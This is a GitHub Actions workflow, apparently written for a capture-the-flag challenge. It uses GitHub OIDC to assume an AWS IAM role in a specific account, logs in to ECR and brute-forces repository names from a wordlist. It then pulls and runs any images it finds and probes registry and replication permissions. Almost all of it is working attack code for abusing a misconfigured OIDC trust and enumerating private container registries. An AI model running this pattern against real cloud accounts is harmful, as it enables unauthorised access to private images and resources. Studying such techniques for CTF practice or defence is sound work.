name: ECR Repository Discovery
on:
  workflow_dispatch:

permissions:
  id-token: write
  contents: read

jobs:
  discover-ecr:
    runs-on: ubuntu-latest
    steps:
      - name: Configure AWS credentials
        uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::396961015104:role/imaginary-challenge
          aws-region: us-east-1

      - name: Login to ECR
        run: |
          aws ecr get-login-password --region us-east-1 | docker login --username AWS --password-stdin 396961015104.dkr.ecr.us-east-1.amazonaws.com

      - name: Systematic ECR Repository Discovery
        run: |
          echo "=== Starting systematic ECR repository discovery ==="
          
          # Comprehensive wordlist based on CTF patterns and challenge hints
          REPOS=(
            # From challenge description
            "forensic" "forensics" "forensic-challenge"
            "imaginary" "imagine" "never-imagined"
            "misconfigure" "misconfigured" "misconfiguration"
            "oidc" "github-oidc" "oidc-misconfig"
            "fiddling" "fiddle" "workflow-fiddling"
            
            # Common CTF patterns
            "ctf" "challenge" "flag" "secret"
            "docker" "container" "image" "repo"
            "ecr" "ecr-challenge" "aws-ctf"
            
            # Combinations
            "forensic-docker" "docker-forensic"
            "imaginary-forensic" "forensic-imaginary"
            "oidc-forensic" "forensic-oidc"
            "github-forensic" "forensic-github"
            "actions-forensic" "forensic-actions"
            
            # Reverse phrases
            "challenge-forensic" "challenge-imaginary"
            "misconfig-forensic" "misconfig-imaginary"
            "docker-challenge" "container-challenge"
            
            # Simple variations
            "test" "demo" "example" "sample"
            "app" "web" "api" "service"
            "backend" "frontend" "database"
          )
          
          found=0
          for repo in "${REPOS[@]}"; do
            echo -n "Testing: $repo ... "
            
            # Try to describe images (quiet check)
            if aws ecr describe-images --repository-name "$repo" --max-items 1 --region us-east-1 >/dev/null 2>&1; then
              echo "✅ FOUND!"
              echo "=== Repository $repo exists ==="
              aws ecr describe-images --repository-name "$repo" --region us-east-1
              found=1
              break
            else
              echo "❌ not found"
            fi
          done
          
          if [ $found -eq 0 ]; then
            echo "=== No repositories found in wordlist ==="
          fi

      - name: Try Docker Pull Anyway
        run: |
          echo "=== Attempting direct Docker pulls ==="
          
          # Even if describe fails, try pulling common names directly
          PULL_REPOS=(
            "forensic" "imaginary" "oidc" "challenge" "ctf" "flag"
            "forensic-challenge" "imaginary-challenge" "oidc-challenge"
          )
          
          for repo in "${PULL_REPOS[@]}"; do
            echo "Attempting to pull: $repo"
            if docker pull 396961015104.dkr.ecr.us-east-1.amazonaws.com/$repo:latest 2>/dev/null; then
              echo "🎉 SUCCESS! Pulled $repo:latest"
              echo "Image details:"
              docker images | grep $repo
              echo "=== Checking container ==="
              docker run --rm 396961015104.dkr.ecr.us-east-1.amazonaws.com/$repo:latest sh -c 'echo "Container ran successfully"'
              break
            elif docker pull 396961015104.dkr.ecr.us-east-1.amazonaws.com/$repo:v1 2>/dev/null; then
              echo "🎉 SUCCESS! Pulled $repo:v1"
              docker images | grep $repo
              docker run --rm 396961015104.dkr.ecr.us-east-1.amazonaws.com/$repo:v1 sh -c 'echo "Container ran successfully"'
              break
            fi
          done

      - name: Check ECR Registry Level
        run: |
          echo "=== Checking ECR registry-level access ==="
          aws ecr describe-registry --region us-east-1 2>/dev/null && echo "Can describe registry" || echo "Cannot describe registry"
          
          echo "=== Checking replication configuration ==="
          aws ecr describe-replication-configurations --region us-east-1 2>/dev/null && echo "Can check replication" || echo "Cannot check replication"

      - name: Final Discovery Attempt
        run: |
          echo "=== Final comprehensive attempt ==="
          
          # Try some wildcard patterns that might exist
          FINAL_ATTEMPTS=(
            "forensics-challenge" "forensic-challenge-2025" "2025-forensic"
            "imaginary-forensic" "forensic-imaginary" 
            "oidc-forensics" "github-forensics"
            "ctf-forensic" "challenge-forensic"
            "docker-forensic-image" "forensic-docker-image"
          )
          
          for repo in "${FINAL_ATTEMPTS[@]}"; do
            echo "Trying: $repo"
            if aws ecr describe-images --repository-name "$repo" --max-items 1 --region us-east-1 >/dev/null 2>&1; then
              echo "🎉 FOUND REPOSITORY: $repo"
              echo "Listing images:"
              aws ecr list-images --repository-name "$repo" --region us-east-1
              
              echo "Attempting to pull..."
              docker pull 396961015104.dkr.ecr.us-east-1.amazonaws.com/$repo:latest && \
                echo "Successfully pulled image" && \
                docker run --rm 396961015104.dkr.ecr.us-east-1.amazonaws.com/$repo:latest || \
                echo "Could not run container"
              break
            fi
          done
